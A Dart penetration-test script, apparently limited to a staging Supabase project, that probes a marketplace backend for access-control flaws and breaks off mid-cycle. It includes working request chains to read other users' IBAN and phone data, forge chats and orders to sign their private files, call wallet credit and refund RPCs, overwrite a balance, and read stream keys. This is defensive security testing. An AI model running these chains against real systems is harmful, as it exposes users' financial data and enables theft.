// ignore_for_file: avoid_print
/// Red Team Cego B — recon + cadeias de composição (staging only).
/// Service_role: setup / observação / cleanup. Nunca actor de exploit.
library;

import 'dart:convert';
import 'dart:io';
import 'dart:math';

import 'package:http/http.dart' as http;

import 'live_ops_staging_client.dart';

const stagingRef = 'fxdknzrqjenzqcvnwqqq';
const stamp = '20260829T1435';

late String base;
late String anon;
late String service;
late LiveOpsStagingClient sb;

late String buyerId;
late String sellerId;
late String buyerJwt;
late String sellerJwt;

final findings = <Map<String, dynamic>>[];
final rec = <String, dynamic>{};
final races = <Map<String, dynamic>>[];
final stripeEv = <Map<String, dynamic>>[];
final gaps = <String>[];
final cycles = <Map<String, dynamic>>[];

String clip(String s, [int n = 400]) {
  s = s.replaceAll(RegExp(r'\s+'), ' ').trim();
  return s.length <= n ? s : '${s.substring(0, n)}…';
}

String maskSecret(String? raw) {
  final s = (raw ?? '').trim();
  if (s.isEmpty) return '';
  if (s.length <= 6) return '***';
  return '${s.substring(0, 3)}…${s.substring(s.length - 2)}#${s.length}';
}

Map<String, String> hAnon() => {
      'apikey': anon,
      'Authorization': 'Bearer $anon',
      'Content-Type': 'application/json',
      'Prefer': 'return=representation',
    };

Map<String, String> hUser(String jwt) => {
      'apikey': anon,
      'Authorization': 'Bearer $jwt',
      'Content-Type': 'application/json',
      'Prefer': 'return=representation',
    };

Map<String, String> hSvc() => {
      'apikey': service,
      'Authorization': 'Bearer $service',
      'Content-Type': 'application/json',
      'Prefer': 'return=representation',
    };

Future<http.Response> rest(
  String method,
  String path, {
  Map<String, String>? headers,
  Object? body,
}) {
  final uri = Uri.parse(path.startsWith('http') ? path : '$base$path');
  final h = headers ?? hAnon();
  final b = body == null
      ? null
      : (body is String ? body : jsonEncode(body));
  switch (method) {
    case 'GET':
      return http.get(uri, headers: h);
    case 'POST':
      return http.post(uri, headers: h, body: b);
    case 'PATCH':
      return http.patch(uri, headers: h, body: b);
    case 'DELETE':
      return http.delete(uri, headers: h, body: b);
    default:
      throw ArgumentError(method);
  }
}

dynamic decode(http.Response r) {
  if (r.body.isEmpty) return null;
  try {
    return jsonDecode(r.body);
  } catch (_) {
    return r.body;
  }
}

void noteFinding({
  required String id,
  required String sev,
  required String title,
  required String actor,
  required String impact,
  Map<String, dynamic>? before,
  Map<String, dynamic>? after,
  Map<String, dynamic>? request,
  Map<String, dynamic>? result,
  String? repro,
  String? preconditions,
}) {
  findings.add({
    'id': id,
    'severity': sev,
    'title': title,
    'actor': actor,
    'preconditions': preconditions,
    'request': request,
    'before': before,
    'result': result,
    'after': after,
    'impact': impact,
    'reproduction': repro,
  });
  print('FINDING $sev $id — $title');
}

Future<void> main() async {
  final env = loadLiveOpsStagingEnv();
  base = normalizeSupabaseProjectUrl(envRequire(env, 'SUPABASE_URL'));
  if (!base.contains(stagingRef)) {
    stderr.writeln('ABORT: not staging $stagingRef');
    exit(2);
  }
  anon = envRequire(env, 'SUPABASE_ANON_KEY');
  service = envRequire(env, 'SUPABASE_SERVICE_ROLE_KEY');
  sb = LiveOpsStagingClient(
    url: base,
    anonKey: anon,
    serviceRoleKey: service,
  );
  buyerId = envRequire(env, 'LIVE_OPS_TEST_BUYER_ID');
  sellerId = envRequire(env, 'LIVE_OPS_TEST_SELLER_ID');

  print('=== RTB-B recon $stamp project=$stagingRef ===');
  buyerJwt = await sb.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_BUYER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_BUYER_PASSWORD'),
  );
  sellerJwt = await sb.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_SELLER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_SELLER_PASSWORD'),
  );
  final bid = await sb.userIdForAccessToken(buyerJwt);
  final sid = await sb.userIdForAccessToken(sellerJwt);
  if (bid != buyerId || sid != sellerId) {
    stderr.writeln('ABORT: JWT uid mismatch bid=$bid/$buyerId sid=$sid/$sellerId');
    exit(2);
  }

  await cycleRecon();
  await cycleFinancialIdentity();
  await cycleStorageComposition();
  await cycleOrderMintBanking();
  await cycleWalletAuthority();
  await cyclePrivacyRest();
  await cycleLiveStockComposition();
  await cyclePairingOcr();
  await cycleEdgeConfusedDeputy();
  await cycleCollusionState();
  await cycleRacesAndPartial();
  await cycleReputationRefund();
  await cycleLastSaturation();

  await writeDeliverables();
  print('DONE findings=${findings.length}');
}

Future<void> cycleRecon() async {
  final c = <String, dynamic>{'cycle': 'recon'};
  final oa = await http.get(
    Uri.parse('$base/rest/v1/'),
    headers: {
      ...hAnon(),
      'Accept': 'application/openapi+json',
    },
  );
  c['openapi_http'] = oa.statusCode;
  final tables = <String>[];
  final rpcs = <String>[];
  if (oa.statusCode == 200) {
    final spec = jsonDecode(oa.body) as Map<String, dynamic>;
    final paths = spec['paths'] as Map<String, dynamic>? ?? {};
    for (final p in paths.keys) {
      if (p.startsWith('/rpc/')) {
        rpcs.add(p.substring(5));
      } else if (p.startsWith('/') && !p.substring(1).contains('/')) {
        tables.add(p.substring(1));
      }
    }
  }
  rec['tables_exposed'] = tables..sort();
  rec['rpcs_exposed'] = rpcs..sort();
  c['tables'] = tables.length;
  c['rpcs'] = rpcs.length;

  final interestingRpc = rpcs.where((r) {
    final x = r.toLowerCase();
    return x.contains('wallet') ||
        x.contains('refund') ||
        x.contains('payout') ||
        x.contains('credit') ||
        x.contains('debit') ||
        x.contains('payment') ||
        x.contains('iban') ||
        x.contains('email') ||
        x.contains('admin') ||
        x.contains('raffle') ||
        x.contains('reservation') ||
        x.contains('dispute') ||
        x.contains('settle') ||
        x.contains('ocr') ||
        x.contains('pairing');
  }).toList();
  rec['rpcs_financial_or_auth'] = interestingRpc;
  c['interesting_rpc'] = interestingRpc;

  final buckets = await http.get(
    Uri.parse('$base/storage/v1/bucket'),
    headers: hAnon(),
  );
  rec['storage_buckets_anon'] = {
    'http': buckets.statusCode,
    'body': clip(buckets.body, 500),
  };

  cycles.add(c);
  print('recon tables=${tables.length} rpcs=${rpcs.length}');
}

Future<void> cycleFinancialIdentity() async {
  final c = <String, dynamic>{'cycle': 'financial_identity'};
  // Column grants via select of sensitive profile fields as other user.
  final cols = [
    'id',
    'full_name',
    'legal_full_name',
    'phone',
    'iban',
    'mb_way',
    'email',
    'shipping_line1',
    'shipping_city',
    'user_type',
    'external_payments_enabled',
  ];
  final r = await rest(
    'GET',
    '/rest/v1/profiles?id=eq.$sellerId&select=${cols.join(",")}',
    headers: hUser(buyerJwt),
  );
  c['buyer_reads_seller_profile'] = {
    'http': r.statusCode,
    'body': clip(r.body),
  };
  final rows = decode(r);
  if (r.statusCode == 200 && rows is List && rows.isNotEmpty) {
    final row = Map<String, dynamic>.from(rows.first as Map);
    final leaked = <String, String>{};
    for (final k in ['iban', 'mb_way', 'phone', 'legal_full_name', 'shipping_line1']) {
      final v = '${row[k] ?? ''}'.trim();
      if (v.isNotEmpty && v != 'null') leaked[k] = maskSecret(v);
    }
    if (leaked.isNotEmpty) {
      noteFinding(
        id: 'RTB2-PII-01',
        sev: 'P1',
        title: 'Comprador lê PII financeiro/identidade do vendedor via profiles',
        actor: 'buyer JWT',
        impact: 'IBAN/telefone/morada de terceiros via REST.',
        request: {'path': 'GET profiles select sensitive', 'as': 'buyer'},
        result: leaked,
      );
    }
    rec['profile_columns_buyer_can_see'] = row.keys.toList();
  } else if (r.statusCode == 400) {
    rec['profile_column_error'] = clip(r.body, 300);
  }

  final rpcBank = await rest(
    'POST',
    '/rest/v1/rpc/batata_seller_direct_payment_details',
    headers: hUser(buyerJwt),
    body: {'p_seller_id': sellerId},
  );
  c['banking_rpc_no_new_order'] = {
    'http': rpcBank.statusCode,
    'body': clip(rpcBank.body, 250),
  };
  cycles.add(c);
}

Future<Map<String, dynamic>?> sellerProduct() async {
  final rows = await sb.select(
    'products',
    filter: 'seller_id=eq.$sellerId&order=created_at.desc',
    limit: 20,
  );
  for (final p in rows) {
    final price = num.tryParse('${p['price'] ?? 0}') ?? 0;
    if (price > 0) return p;
  }
  return rows.isEmpty ? null : rows.first;
}

Future<void> cycleStorageComposition() async {
  final c = <String, dynamic>{'cycle': 'storage_composition'};
  // Victim = seller (has likely chat/proofs). Attacker = buyer creates chat.
  // Also mint a secret object via service under seller's prefix.
  final secretName =
      'rtb2_${stamp}_${Random().nextInt(99999)}_secret.txt';
  final chatPath = 'chat_uploads/$sellerId/$secretName';
  final proofOrder = '00000000-0000-0000-0000-00000000rtb2';
  final proofPath = 'order_proofs/$sellerId/$proofOrder/$secretName';

  Future<int> svcUpload(String bucket, String path, String text) async {
    final r = await http.post(
      Uri.parse('$base/storage/v1/object/$bucket/$path'),
      headers: {
        'apikey': service,
        'Authorization': 'Bearer $service',
        'Content-Type': 'text/plain',
        'x-upsert': 'true',
      },
      body: text,
    );
    return r.statusCode;
  }

  c['svc_chat_upload'] = await svcUpload(
    'fleaber_private',
    chatPath,
    'RTB2_CHAT_SECRET_$stamp',
  );
  c['svc_proof_upload'] = await svcUpload(
    'fleaber_private',
    proofPath,
    'RTB2_PROOF_SECRET_$stamp',
  );

  // Buyer opens chat with seller (legitimate) — then try to read ALL seller uploads.
  final chatIns = await rest(
    'POST',
    '/rest/v1/chats',
    headers: hUser(buyerJwt),
    body: {
      'user_a': buyerId,
      'user_b': sellerId,
    },
  );
  c['chat_insert'] = {'http': chatIns.statusCode, 'body': clip(chatIns.body, 200)};

  // Third-party: find another profile, buyer inserts chat, try their uploads.
  final others = await sb.select('profiles', filter: 'id=neq.$buyerId&id=neq.$sellerId', limit: 5);
  String? thirdId;
  if (others.isNotEmpty) {
    thirdId = others.first['id']?.toString();
  }
  c['third_id'] = thirdId;

  if (thirdId != null) {
    final thirdChat = await rest(
      'POST',
      '/rest/v1/chats',
      headers: hUser(buyerJwt),
      body: {'user_a': buyerId, 'user_b': thirdId},
    );
    c['third_chat_insert'] = {
      'http': thirdChat.statusCode,
      'body': clip(thirdChat.body, 180),
    };
    final thirdPath = 'chat_uploads/$thirdId/rtb2_third_$stamp.txt';
    c['svc_third_upload'] = await svcUpload(
      'fleaber_private',
      thirdPath,
      'THIRD_SECRET',
    );
    final listThird = await http.post(
      Uri.parse('$base/storage/v1/object/list/fleaber_private'),
      headers: hUser(buyerJwt),
      body: jsonEncode({
        'prefix': 'chat_uploads/$thirdId/',
        'limit': 50,
      }),
    );
    c['buyer_list_third_chat'] = {
      'http': listThird.statusCode,
      'body': clip(listThird.body, 400),
    };
    final signThird = await http.post(
      Uri.parse(
        '$base/storage/v1/object/sign/fleaber_private/${Uri.encodeComponent(thirdPath)}',
      ),
      headers: hUser(buyerJwt),
      body: jsonEncode({'expiresIn': 60}),
    );
    c['buyer_sign_third_chat'] = {
      'http': signThird.statusCode,
      'body': clip(signThird.body, 250),
    };
    final listed = decode(listThird);
    final signedOk = signThird.statusCode == 200 &&
        (signThird.body.contains('signedURL') ||
            signThird.body.contains('signedUrl'));
    if (signedOk ||
        (listThird.statusCode == 200 &&
            listed is List &&
            listed.any((e) => '$e'.contains('rtb2_third')))) {
      noteFinding(
        id: 'RTB2-STOR-01',
        sev: 'P1',
        title:
            'Chat fabricado com terceiro → leitura de todos os chat_uploads desse user',
        actor: 'buyer JWT',
        preconditions:
            'INSERT chats com user_b alheio (RLS permite ser participante).',
        request: {
          'chat_insert': 'POST chats user_a=buyer user_b=third',
          'storage': 'list+sign fleaber_private/chat_uploads/{third}/',
        },
        result: {
          'list_http': listThird.statusCode,
          'sign_http': signThird.statusCode,
          'sign_body': clip(signThird.body, 200),
        },
        impact:
            'Media de conversas do terceiro com outras pessoas fica acessível após um chat vazio.',
        repro:
            '1) POST chats como A com B. 2) Listar chat_uploads/B/. 3) Assinar objecto que B enviou noutro chat.',
      );
    }
  }

  final listSellerChat = await http.post(
    Uri.parse('$base/storage/v1/object/list/fleaber_private'),
    headers: hUser(buyerJwt),
    body: jsonEncode({'prefix': 'chat_uploads/$sellerId/', 'limit': 50}),
  );
  c['buyer_list_seller_chat'] = {
    'http': listSellerChat.statusCode,
    'body': clip(listSellerChat.body, 400),
  };
  final signSellerChat = await http.post(
    Uri.parse(
      '$base/storage/v1/object/sign/fleaber_private/${Uri.encodeComponent(chatPath)}',
    ),
    headers: hUser(buyerJwt),
    body: jsonEncode({'expiresIn': 60}),
  );
  c['buyer_sign_seller_secret'] = {
    'http': signSellerChat.statusCode,
    'body': clip(signSellerChat.body, 250),
  };
  if (signSellerChat.statusCode == 200 &&
      (signSellerChat.body.contains('signedURL') ||
          signSellerChat.body.contains('signedUrl'))) {
    noteFinding(
      id: 'RTB2-STOR-02',
      sev: 'P1',
      title:
          'Participante de chat lê objecto secreto noutro prefixo do interlocutor',
      actor: 'buyer JWT',
      impact:
          'Política storage casa prefixo user, não chat_id — qualquer ficheiro do interlocutor.',
      request: {'sign': chatPath},
      result: {'http': signSellerChat.statusCode},
    );
  }

  // Seller mints order with buyer=seller (self as buyer of own product)? 
  // Better: seller mints order where buyer is a third party, then reads their proofs.
  if (thirdId != null) {
    final prod = await sellerProduct();
    Map<String, dynamic>? minted;
    if (prod != null) {
      final ins = await rest(
        'POST',
        '/rest/v1/orders',
        headers: hUser(sellerJwt),
        body: {
          'seller_id': sellerId,
          'buyer_id': thirdId,
          'product_id': prod['id'],
          'quantity': 1,
          'status': 'reserva_pendente',
          'payment_method': 'MB WAY',
        },
      );
      c['seller_mint_order_third'] = {
        'http': ins.statusCode,
        'body': clip(ins.body, 250),
      };
      final d = decode(ins);
      if (d is List && d.isNotEmpty) {
        minted = Map<String, dynamic>.from(d.first as Map);
      } else if (d is Map) {
        minted = Map<String, dynamic>.from(d);
      }
    }
    final thirdProof = 'order_proofs/$thirdId/$proofOrder/$secretName';
    c['svc_third_proof'] = await svcUpload(
      'fleaber_private',
      thirdProof,
      'THIRD_PROOF_SECRET',
    );
    final signProof = await http.post(
      Uri.parse(
        '$base/storage/v1/object/sign/fleaber_private/${Uri.encodeComponent(thirdProof)}',
      ),
      headers: hUser(sellerJwt),
      body: jsonEncode({'expiresIn': 60}),
    );
    c['seller_sign_third_proof'] = {
      'http': signProof.statusCode,
      'body': clip(signProof.body, 250),
      'minted_order': minted?['id'],
    };
    if (signProof.statusCode == 200 &&
        (signProof.body.contains('signedURL') ||
            signProof.body.contains('signedUrl'))) {
      noteFinding(
        id: 'RTB2-STOR-03',
        sev: 'P1',
        title:
            'Encomenda fabricada (seller) → leitura de todas as provas do comprador alvo',
        actor: 'seller JWT',
        preconditions:
            'INSERT orders com buyer_id alheio (RLS seller_id=uid) + objecto order_proofs/{buyer}/…',
        request: {
          'order_insert': 'seller_id=self buyer_id=third',
          'sign': thirdProof,
        },
        result: {
          'order_id': minted?['id'],
          'sign_http': signProof.statusCode,
        },
        impact:
            'Provas de encomendas do alvo com outros vendedores ficam acessíveis.',
        repro:
            '1) Seller INSERT order buyer=vítima. 2) Assinar order_proofs/{vítima}/{order_alheia}/ficheiro.',
      );
    }
    if (minted?['id'] != null) {
      await rest(
        'PATCH',
        '/rest/v1/orders?id=eq.${minted!['id']}',
        headers: hSvc(),
        body: {'status': 'cancelado'},
      );
    }
  }

  cycles.add(c);
}

Future<void> cycleOrderMintBanking() async {
  final c = <String, dynamic>{'cycle': 'order_mint_banking'};
  final prod = await sellerProduct();
  if (prod == null) {
    gaps.add('sem produto do seller para mint order');
    cycles.add(c);
    return;
  }
  c['product_id'] = prod['id'];

  // Observe seller banking via service (setup/obs only).
  final prof = await sb.select(
    'profiles',
    filter: 'id=eq.$sellerId',
    limit: 1,
  );
  final hasBank = prof.isNotEmpty &&
      ((prof.first['iban'] ?? '').toString().trim().isNotEmpty ||
          (prof.first['mb_way'] ?? '').toString().trim().isNotEmpty);
  c['seller_has_bank_obs'] = hasBank;
  c['external_payments'] = prof.isEmpty
      ? null
      : prof.first['external_payments_enabled'];

  final beforeRpc = await rest(
    'POST',
    '/rest/v1/rpc/batata_seller_direct_payment_details',
    headers: hUser(buyerJwt),
    body: {'p_seller_id': sellerId},
  );
  c['rpc_before'] = {
    'http': beforeRpc.statusCode,
    'body': clip(beforeRpc.body, 200),
  };

  final ins = await rest(
    'POST',
    '/rest/v1/orders',
    headers: hUser(buyerJwt),
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': prod['id'],
      'quantity': 1,
      'status': 'reservado',
      'payment_method': 'MB WAY',
    },
  );
  c['insert_reservado'] = {
    'http': ins.statusCode,
    'body': clip(ins.body, 400),
  };
  Map<String, dynamic>? order;
  final d = decode(ins);
  if (d is List && d.isNotEmpty) {
    order = Map<String, dynamic>.from(d.first as Map);
  } else if (d is Map && d['id'] != null) {
    order = Map<String, dynamic>.from(d);
  }

  if (order == null && ins.statusCode >= 400) {
    final ins2 = await rest(
      'POST',
      '/rest/v1/orders',
      headers: hUser(buyerJwt),
      body: {
        'buyer_id': buyerId,
        'product_id': prod['id'],
        'quantity': 1,
        'status': 'reserva_pendente',
        'payment_method': 'MB WAY',
      },
    );
    c['insert_pendente'] = {
      'http': ins2.statusCode,
      'body': clip(ins2.body, 400),
    };
    final d2 = decode(ins2);
    if (d2 is List && d2.isNotEmpty) {
      order = Map<String, dynamic>.from(d2.first as Map);
    }
    if (order != null) {
      final patch = await rest(
        'PATCH',
        '/rest/v1/orders?id=eq.${order['id']}',
        headers: hUser(buyerJwt),
        body: {'status': 'reservado'},
      );
      c['buyer_patch_reservado'] = {
        'http': patch.statusCode,
        'body': clip(patch.body, 250),
      };
      final d3 = decode(patch);
      if (d3 is List && d3.isNotEmpty) {
        order = Map<String, dynamic>.from(d3.first as Map);
      }
    }
  }

  c['order_after_mint'] = {
    'id': order?['id'],
    'status': order?['status'],
    'payment_method': order?['payment_method'],
    'seller_id': order?['seller_id'],
  };

  final afterRpc = await rest(
    'POST',
    '/rest/v1/rpc/batata_seller_direct_payment_details',
    headers: hUser(buyerJwt),
    body: {'p_seller_id': sellerId},
  );
  c['rpc_after'] = {
    'http': afterRpc.statusCode,
    'body': clip(afterRpc.body, 300),
  };

  bool leaked = false;
  final afterBody = decode(afterRpc);
  if (afterRpc.statusCode == 200 && afterBody is List && afterBody.isNotEmpty) {
    final row = afterBody.first;
    if (row is Map) {
      final iban = '${row['iban'] ?? ''}'.trim();
      final mb = '${row['mb_way'] ?? ''}'.trim();
      leaked = iban.isNotEmpty || mb.isNotEmpty;
    }
  } else if (afterRpc.statusCode == 200 && afterBody is Map) {
    leaked = '${afterBody['iban'] ?? ''}${afterBody['mb_way'] ?? ''}'
        .trim()
        .isNotEmpty;
  }

  final beforeEmpty = beforeRpc.body.trim() == '[]' ||
      beforeRpc.body.trim() == 'null' ||
      beforeRpc.body.trim().isEmpty;
  if (leaked &&
      (order?['status']?.toString().toLowerCase() == 'reservado' ||
          order?['status']?.toString().toLowerCase() ==
              'aguarda_confirmacao') &&
      beforeEmpty) {
    noteFinding(
      id: 'RTB2-BANK-01',
      sev: 'P1',
      title:
          'Comprador fabrica order off-platform em reservado e obtém IBAN/MB WAY',
      actor: 'buyer JWT',
      preconditions:
          'Produto real do vendedor; seller com pagamentos externos.',
      request: {
        'insert': 'POST orders status=reservado payment_method=MB WAY',
        'rpc': 'batata_seller_direct_payment_details',
      },
      before: {'rpc': clip(beforeRpc.body, 80), 'order': null},
      after: {
        'order_id': order?['id'],
        'status': order?['status'],
        'rpc_masked': clip(afterRpc.body, 80),
      },
      impact:
          'Oráculo bancário: relação comercial fabricada sem aceitação do vendedor.',
      repro:
          'INSERT order (buyer) status=reservado + MB WAY no produto da vítima; RPC details.',
    );
  } else if (leaked) {
    c['rpc_leaked_but_maybe_preexisting'] = true;
  }

  // Cleanup mint
  if (order?['id'] != null) {
    await rest(
      'PATCH',
      '/rest/v1/orders?id=eq.${order!['id']}',
      headers: hSvc(),
      body: {'status': 'cancelado'},
    );
  }
  cycles.add(c);
}

Future<void> cycleWalletAuthority() async {
  final c = <String, dynamic>{'cycle': 'wallet_rpc'};
  final probes = <String, dynamic>{};

  Future<void> tryRpc(String name, Map<String, dynamic> body, String jwt) async {
    final r = await rest(
      'POST',
      '/rest/v1/rpc/$name',
      headers: hUser(jwt),
      body: body,
    );
    probes[name] = {'http': r.statusCode, 'body': clip(r.body, 220)};
    final ok = r.statusCode == 200 &&
        !r.body.toLowerCase().contains('permission') &&
        !r.body.toLowerCase().contains('not_allowed') &&
        !r.body.toLowerCase().contains('42501');
    if (ok &&
        (name.contains('credit') ||
            name.contains('debit') ||
            name.contains('refund') ||
            name.contains('release') ||
            name.contains('clawback') ||
            name.contains('partial'))) {
      noteFinding(
        id: 'RTB2-WAL-01',
        sev: 'P0',
        title: 'RPC wallet invocável por JWT: $name',
        actor: jwt == buyerJwt ? 'buyer' : 'seller',
        request: {'rpc': name, 'body': body},
        result: {'http': r.statusCode, 'body': clip(r.body, 200)},
        impact: 'Mutação de saldo sem Edge/service_role.',
      );
    }
  }

  await tryRpc(
    'batata_credit_wallet_once',
    {
      'p_wallet_id': buyerId,
      'p_order_id': '00000000-0000-0000-0000-000000000001',
      'p_amount': 10,
      'p_entry_type': 'credit',
      'p_note': 'rtb2',
    },
    buyerJwt,
  );
  await tryRpc(
    'batata_debit_wallet_once',
    {
      'p_wallet_id': sellerId,
      'p_order_id': '00000000-0000-0000-0000-000000000001',
      'p_amount': 1,
      'p_reason': 'rtb2',
    },
    sellerJwt,
  );
  await tryRpc(
    'batata_release_seller_wallet_for_order',
    {'p_order_id': '00000000-0000-0000-0000-000000000001'},
    sellerJwt,
  );
  await tryRpc(
    'batata_refund_buyer_wallet_for_order',
    {'p_order_id': '00000000-0000-0000-0000-000000000001'},
    buyerJwt,
  );
  await tryRpc(
    'batata_process_partial_refund_dispute',
    {
      'p_order_id': '00000000-0000-0000-0000-000000000001',
      'p_amount': 1,
    },
    buyerJwt,
  );
  await tryRpc(
    'batata_ensure_wallet',
    {'p_user_id': sellerId},
    buyerJwt,
  );
  await tryRpc(
    'batata_find_user_id_by_email',
    {'p_email': envEmailHint()},
    buyerJwt,
  );
  await tryRpc(
    'batata_find_user_id_by_email',
    {'p_email': envEmailHint()},
    sellerJwt,
  );

  final wPatch = await rest(
    'PATCH',
    '/rest/v1/wallets?id=eq.$sellerId',
    headers: hUser(buyerJwt),
    body: {'balance': 9999},
  );
  probes['wallet_patch_other'] = {
    'http': wPatch.statusCode,
    'body': clip(wPatch.body, 180),
  };
  c['probes'] = probes;
  cycles.add(c);
}

String envEmailHint() {
  try {
    final env = loadLiveOpsStagingEnv();
    return env['LIVE_OPS_TEST_BUYER_EMAIL'] ?? 'nobody@example.com';
  } catch (_) {
    return 'nobody@example.com';
  }
}

Future<void> cyclePrivacyRest() async {
  final c = <String, dynamic>{'cycle': 'privacy_rest'};
  final paths = <String, String>{
    'orders_all': '/rest/v1/orders?select=id,buyer_id,seller_id,status,price_total&limit=5',
    'chats_all': '/rest/v1/chats?select=id,user_a,user_b&limit=5',
    'chat_messages': '/rest/v1/chat_messages?select=id,chat_id,content,message&limit=5',
    'wallets': '/rest/v1/wallets?select=id,balance&limit=5',
    'stripe_events':
        '/rest/v1/stripe_checkout_events?select=id,session_id,buyer_id,order_id&limit=5',
    'lives_keys':
        '/rest/v1/lives?select=id,mux_stream_key,stream_key,seller_id&limit=3',
    'disputes': '/rest/v1/order_disputes?select=id,order_id,buyer_id,status&limit=5',
    'pairing': '/rest/v1/ps_pairing_sessions?select=*&limit=3',
    'reservations':
        '/rest/v1/live_reservation_requests?select=id,buyer_id,seller_id,status,live_item_id&limit=5',
    'tips': '/rest/v1/live_tips?select=id,buyer_id,seller_id,amount,status&limit=5',
  };
  final out = <String, dynamic>{};
  for (final e in paths.entries) {
    final r = await rest('GET', e.value, headers: hUser(buyerJwt));
    out[e.key] = {'http': r.statusCode, 'body': clip(r.body, 220)};
    if (e.key == 'lives_keys' && r.statusCode == 200) {
      final rows = decode(r);
      if (rows is List) {
        for (final row in rows) {
          if (row is! Map) continue;
          final k = '${row['mux_stream_key'] ?? row['stream_key'] ?? ''}'.trim();
          final owner = '${row['seller_id'] ?? ''}';
          if (k.isNotEmpty && owner != buyerId) {
            noteFinding(
              id: 'RTB2-MUX-01',
              sev: 'P1',
              title: 'Buyer lê stream_key Mux de live alheia',
              actor: 'buyer JWT',
              request: {'select': 'lives.mux_stream_key'},
              result: {
                'live_id': row['id'],
                'key_len': k.length,
                'prefix': k.substring(0, min(4, k.length)),
              },
              impact: 'Hijack de ingestão RTMP / custo Mux.',
            );
          }
        }
      }
    }
    if (e.key == 'stripe_events' &&
        r.statusCode == 200 &&
        r.body.contains('cs_')) {
      noteFinding(
        id: 'RTB2-STRIPE-01',
        sev: 'P1',
        title: 'session_id Stripe de terceiros via stripe_checkout_events',
        actor: 'buyer JWT',
        result: {'body': clip(r.body, 200)},
        impact: 'GET settle na Edge com session_id alheio (verify_jwt=false).',
      );
    }
    if (e.key == 'pairing' && r.statusCode == 200 && r.body.contains('code')) {
      noteFinding(
        id: 'RTB2-PS-01',
        sev: 'P1',
        title: 'ps_pairing_sessions visível (códigos/tokens)',
        actor: 'buyer JWT',
        result: {'body': clip(r.body, 200)},
        impact: 'Claim pairing + OCR ingest no directo da vítima.',
      );
    }
    if (e.key == 'orders_all' && r.statusCode == 200) {
      final rows = decode(r);
      if (rows is List) {
        final foreign = rows.where((row) {
          if (row is! Map) return false;
          final b = '${row['buyer_id']}';
          final s = '${row['seller_id']}';
          return b != buyerId && s != buyerId;
        }).toList();
        if (foreign.isNotEmpty) {
          noteFinding(
            id: 'RTB2-ORD-01',
            sev: 'P1',
            title: 'Orders de terceiros visíveis ao buyer',
            actor: 'buyer JWT',
            result: {'count': foreign.length, 'sample': foreign.first},
            impact: 'Cross-user de encomendas (preço, estado, IDs).',
          );
        }
      }
    }
  }
  c['gets'] = out;

  // Anon
  final anonOrders = await rest(
    'GET',
    '/rest/v1/orders?select=id,status,price_total&limit=3',
    headers: hAnon(),
  );
  c['anon_orders'] = {
    'http': anonOrders.statusCode,
    'body': clip(anonOrders.body, 150),
  };
  cycles.add(c);
}

Future<void> cycleLiveStockComposition() async {
  final c = <String, dynamic>{'cycle': 'live_stock_dual_pool'};
  // Setup: product stock=1 + live_item qty=1 same product.
  final prodIns = await rest(
    'POST',
    '/rest/v1/products',
    headers: hSvc(),
    body: {
      'seller_id': sellerId,
      'title': 'RTB2 dual-pool $stamp',
      'price': 5.00,
      'quantity': 1,
      'status': 'active',
    },
  );
  c['product_insert'] = {
    'http': prodIns.statusCode,
    'body': clip(prodIns.body, 250),
  };
  Map<String, dynamic>? prod;
  final pd = decode(prodIns);
  if (pd is List && pd.isNotEmpty) {
    prod = Map<String, dynamic>.from(pd.first as Map);
  } else if (pd is Map && pd['id'] != null) {
    prod = Map<String, dynamic>.from(pd);
  }
  if (prod == null) {
    // JWT seller insert
    final p2 = await rest(
      'POST',
      '/rest/v1/products',
      headers: hUser(sellerJwt),
      body: {
        'seller_id': sellerId,
        'title': 'RTB2 dual-pool jwt $stamp',
        'price': 5.00,
        'quantity': 1,
      },
    );
    c['product_jwt'] = {'http': p2.statusCode, 'body': clip(p2.body, 250)};
    final d2 = decode(p2);
    if (d2 is List && d2.isNotEmpty) {
      prod = Map<String, dynamic>.from(d2.first as Map);
    }
  }
  if (prod == null) {
    gaps.add('não criou produto dual-pool');
    cycles.add(c);
    return;
  }
  final pid = prod['id'].toString();

  // Find or create a live for seller
  final lives = await sb.select(
    'lives',
    filter: 'seller_id=eq.$sellerId&order=created_at.desc',
    limit: 5,
  );
  String? liveId;
  if (lives.isNotEmpty) {
    liveId = lives.first['id']?.toString();
  }
  if (liveId == null) {
    gaps.add('sem live do seller para dual-pool');
    cycles.add(c);
    return;
  }

  final liIns = await rest(
    'POST',
    '/rest/v1/live_items',
    headers: hSvc(),
    body: {
      'live_id': liveId,
      'seller_id': sellerId,
      'product_id': pid,
      'title': 'RTB2 item $stamp',
      'price': 5.00,
      'quantity': 1,
    },
  );
  c['live_item_insert'] = {
    'http': liIns.statusCode,
    'body': clip(liIns.body, 300),
  };
  Map<String, dynamic>? li;
  final lid = decode(liIns);
  if (lid is List && lid.isNotEmpty) {
    li = Map<String, dynamic>.from(lid.first as Map);
  } else if (lid is Map && lid['id'] != null) {
    li = Map<String, dynamic>.from(lid);
  }
  if (li == null) {
    gaps.add('não criou live_item (schema?)');
    cycles.add(c);
    return;
  }
  final liveItemId = li['id'].toString();

  // Buyer JWT: pending reservation
  final resIns = await rest(
    'POST',
    '/rest/v1/live_reservation_requests',
    headers: hUser(buyerJwt),
    body: {
      'live_id': liveId,
      'live_item_id': liveItemId,
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'requested_qty': 1,
      'status': 'pending',
    },
  );
  c['res_insert'] = {'http': resIns.statusCode, 'body': clip(resIns.body, 300)};
  Map<String, dynamic>? res;
  final rd = decode(resIns);
  if (rd is List && rd.isNotEmpty) {
    res = Map<String, dynamic>.from(rd.first as Map);
  } else if (rd is Map && rd['id'] != null) {
    res = Map<String, dynamic>.from(rd);
  }

  if (res != null) {
    final acc = await rest(
      'PATCH',
      '/rest/v1/live_reservation_requests?id=eq.${res['id']}',
      headers: hUser(sellerJwt),
      body: {'status': 'accepted'},
    );
    c['res_accept'] = {'http': acc.statusCode, 'body': clip(acc.body, 250)};
    final ad = decode(acc);
    if (ad is List && ad.isNotEmpty) {
      res = Map<String, dynamic>.from(ad.first as Map);
    }
  }

  // Marketplace order on same product (buyer) while live reservation consumes capacity
  final mkt = await rest(
    'POST',
    '/rest/v1/orders',
    headers: hUser(buyerJwt),
    body: {
      'buyer_id': buyerId,
      'product_id': pid,
      'quantity': 1,
      'status': 'reserva_pendente',
      'payment_method': 'MB WAY',
    },
  );
